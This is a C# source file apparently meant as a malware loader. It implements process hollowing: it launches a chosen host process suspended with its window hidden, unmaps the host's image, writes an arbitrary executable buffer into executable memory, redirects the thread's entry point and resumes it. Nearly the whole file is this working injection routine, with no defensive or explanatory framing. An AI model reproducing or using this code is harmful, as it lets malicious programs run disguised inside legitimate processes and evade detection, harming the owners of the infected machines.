using System;
using System.Runtime.InteropServices;

namespace loader
{
    public static unsafe class loader
    {
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }


        /// <param name="exeBuffer">The EXE buffer.</param>
        /// <param name="hostProcess">Full path of the host process to run the buffer in.</param>
        /// <param name="optionalArguments">Optional command line arguments.</param>
        public static int Run(byte[] exeBuffer, string hostProcess, string optionalArguments = "")
        {
            STARTUPINFO StartupInfo = new STARTUPINFO();
            StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
            StartupInfo.wShowWindow = SW_HIDE;

            var IMAGE_SECTION_HEADER = new byte[0x28];
            var IMAGE_NT_HEADERS = new byte[0xf8];
            var IMAGE_DOS_HEADER = new byte[0x40];
            var PROCESS_INFO = new int[0x4];
            var CONTEXT = new byte[0x2cc];

            byte* pish;
            fixed (byte* p = &IMAGE_SECTION_HEADER[0])
                pish = p;

            byte* pinh;
            fixed (byte* p = &IMAGE_NT_HEADERS[0])
                pinh = p;

            byte* pidh;
            fixed (byte* p = &IMAGE_DOS_HEADER[0])
                pidh = p;

            byte* ctx;
            fixed (byte* p = &CONTEXT[0])
                ctx = p;

            *(uint*)(ctx + 0x0) = CONTEXT_FULL;

            Buffer.BlockCopy(exeBuffer, 0, IMAGE_DOS_HEADER, 0, IMAGE_DOS_HEADER.Length);

            if (*(ushort*)(pidh + 0x0) != IMAGE_DOS_SIGNATURE)
                return 1;

            var e_lfanew = *(int*)(pidh + 0x3c);

            Buffer.BlockCopy(exeBuffer, e_lfanew, IMAGE_NT_HEADERS, 0, IMAGE_NT_HEADERS.Length);

            if (*(uint*)(pinh + 0x0) != IMAGE_NT_SIGNATURE)
                return 2;

            if (!string.IsNullOrEmpty(optionalArguments))
                hostProcess += " " + optionalArguments;

            if (!CreateProcess(null, hostProcess, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref StartupInfo, PROCESS_INFO))
                return 3;

            var ImageBase = new IntPtr(*(int*)(pinh + 0x34));
            NtUnmapViewOfSection((IntPtr)PROCESS_INFO[0], ImageBase);
            if (VirtualAllocEx((IntPtr)PROCESS_INFO[0], ImageBase, *(uint*)(pinh + 0x50), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == IntPtr.Zero)
                return 4;

            fixed (byte* p = &exeBuffer[0])
                NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0], ImageBase, (IntPtr)p, *(uint*)(pinh + 84), IntPtr.Zero);

            for (ushort i = 0; i < *(ushort*)(pinh + 0x6); i++)
            {
                Buffer.BlockCopy(exeBuffer, e_lfanew + IMAGE_NT_HEADERS.Length + (IMAGE_SECTION_HEADER.Length * i), IMAGE_SECTION_HEADER, 0, IMAGE_SECTION_HEADER.Length);
                fixed (byte* p = &exeBuffer[*(uint*)(pish + 0x14)])
                    NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0], (IntPtr)((int)ImageBase + *(uint*)(pish + 0xc)), (IntPtr)p, *(uint*)(pish + 0x10), IntPtr.Zero);
            }

            NtGetContextThread((IntPtr)PROCESS_INFO[1], (IntPtr)ctx);
            NtWriteVirtualMemory((IntPtr)PROCESS_INFO[0], (IntPtr)(*(uint*)(ctx + 0xAC)), ImageBase, 0x4, IntPtr.Zero);
            *(uint*)(ctx + 0xB0) = (uint)ImageBase + *(uint*)(pinh + 0x28);
            NtSetContextThread((IntPtr)PROCESS_INFO[1], (IntPtr)ctx);
            NtResumeThread((IntPtr)PROCESS_INFO[1], IntPtr.Zero);

            return 0;
        }


        private const uint CONTEXT_FULL = 0x10007;
        private const int CREATE_SUSPENDED = 0x4;
        private const int MEM_COMMIT = 0x1000;
        private const int MEM_RESERVE = 0x2000;
        private const int PAGE_EXECUTE_READWRITE = 0x40;
        private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;
        private const uint IMAGE_NT_SIGNATURE = 0x00004550;

        private static short SW_SHOW = 5;
        private static short SW_HIDE = 0;
        private const uint STARTF_USESTDHANDLES = 0x00000100;
        private const uint STARTF_USESHOWWINDOW = 0x00000001;


        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
              IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
              uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
              ref STARTUPINFO lpStartupInfo, int[] lpProcessInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtGetContextThread(IntPtr hThread, IntPtr lpContext);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetContextThread(IntPtr hThread, IntPtr lpContext);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtResumeThread(IntPtr hThread, IntPtr SuspendCount);

    }
}